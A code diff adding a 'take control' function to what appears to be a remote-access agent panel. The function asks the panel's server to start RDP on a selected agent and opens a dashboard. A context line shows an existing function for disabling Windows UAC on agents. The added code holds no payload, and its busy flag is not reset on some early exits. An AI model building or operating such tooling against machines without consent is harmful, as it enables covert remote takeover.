@@ -128,3 +128,65 @@ async function disableUAC() {
   if (menu) menu.classList.remove("open");
   if (btn) btn.setAttribute("aria-expanded", "false");
 }
+
+// Load selected agents from localStorage
+function getSelectedAgents() {
+  const data = localStorage.getItem("rdp_selected_agents");
+  return data ? JSON.parse(data) : {};
+}
+
+// ==================== TAKE CONTROL (RDP START) ====================
+let _takeControlBusy = false;
+async function takeControl() {
+  if (_takeControlBusy) return;
+  _takeControlBusy = true;
+  console.log("[takeControl] Clicked");
+
+  const bottomPanel = document.querySelector('.bottom-panel');
+  const agentId = bottomPanel ? (bottomPanel.getAttribute('data-agent-id') || null) : null;
+
+  if (!agentId) {
+    alert("Agent not selected. Please select an agent first.");
+    return;
+  }
+
+  // Check if this agent has RDP checkbox checked
+  const selected = getSelectedAgents();
+  const agentUuid = bottomPanel.getAttribute('data-agent-uuid') || null;
+
+  if (agentUuid && !selected[agentUuid]) {
+    if (!confirm("Агент не отмечен для RDP (галочка RDP в таблице). Всё равно запустить?")) {
+      return;
+    }
+  }
+
+  try {
+    const response = await fetch(`/api/agent/${agentId}/start-rdp`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "{}",
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
+    }
+
+    const data = await response.json();
+    console.log("[takeControl] Response:", data);
+
+    if (data.agent_connected) {
+      alert("✓ Команда запуска RDP отправлена агенту. Открываю дашборд...");
+    } else {
+      alert("Агент не подключён к WebSocket. Попробуйте позже.");
+      return;
+    }
+  } catch (error) {
+    console.error("[takeControl] Error:", error);
+    alert("Failed to start RDP: " + error.message);
+    _takeControlBusy = false;
+    return;
+  }
+
+  window.open('/rdp/dashboard', '_blank');
+  _takeControlBusy = false;
+}
